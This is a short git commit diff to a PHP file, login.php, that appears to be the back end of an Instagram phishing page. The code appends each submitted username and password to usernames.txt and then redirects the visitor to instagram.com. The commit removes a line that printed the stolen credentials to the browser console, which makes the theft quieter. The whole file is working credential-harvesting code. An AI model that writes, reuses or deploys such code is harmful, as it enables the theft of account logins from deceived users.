9c3b464eb3575a3c3511921753cf7ae1b8e53f1a
mittalkunal47 <mittalkunal47@gmail.com>
2020-07-21 09:13:40 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,6 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-echo "<script>console.log('Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n' );</script>";
 header('Location: https://instagram.com');
 exit();
